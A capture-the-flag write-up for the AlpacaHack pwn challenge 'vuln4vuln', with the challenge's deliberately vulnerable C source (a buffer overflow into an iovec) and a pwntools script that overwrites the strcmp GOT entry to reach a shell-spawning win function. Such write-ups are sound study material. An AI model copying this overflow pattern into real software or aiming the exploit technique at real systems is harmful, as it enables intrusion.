+++
date = '2026-03-22'
title = 'vuln4vuln (22/03/2026)'
tags = ['pwn', 'hard']
+++

https://alpacahack.com/daily/challenges/vuln4vuln

Category: Pwn

Difficulty: Hard

Author: k0080

## Description

Welcome! Hackers

## Solution

The program first reads a username, and then a password, then calls `strcmp` to compare this password.

Now looking at the provided C source, we can see a few things:
```c
#define PASSWD "ALPACAPA\n"

char name[0x10];
char passwd[0x10];
struct iovec iov;

void win() {
    execve("/bin/sh", NULL, NULL);
}

int main() {
    iov.iov_base = passwd;
    iov.iov_len = sizeof(passwd);
    fgets(name,0x28,stdin);
    readv(STDIN_FILENO,&iov,1);
    if (strcmp(passwd, PASSWD) == 0) {
        printf("Welcome! %s\n",name);
    } else {
        printf("Wait a minute, who are you?\n");
    }
}
```

1. The goal will be to trigger the win function, which will give us shell access.
2. Reading name has a buffer overflow, since it reads 0x27 bytes (+ null terminator), but only allocates 0x10 bytes
3. Reading the password uses an iovec.

We can use this buffer overflow to write in the address field of the iovec, which will cause the password to be written at an address of our choosing.

So now that we can write anywhere, we still have to find where. First I tried writing at the return address on the stack, 
but since we can't leak this address and the stack address is randomized, this was not an option. 
So the trick here is to write in the GOT table entry of `strcmp`, since RELRO is set to partial this is possible. In this GOT entry we will write
the address of `win`, giving us shell access once the code tries to call `strcmp` and calls `win` instead.

### Solution Script

```py
from pwn import *

elf = ELF('chal')

strcmp_got = elf.got['strcmp']
win_addr = elf.symbols['win']

p = remote('127.0.0.1', 39935)

# Write address of GOT entry to the iovec
payload1 = b'a' * 0x20 + p64(strcmp_got)
p.send(payload1[:0x27])

# Write the address of win in the GOT entry
payload2 = p64(win_addr) + b'\x00' * 8
p.send(payload2)

p.interactive()
```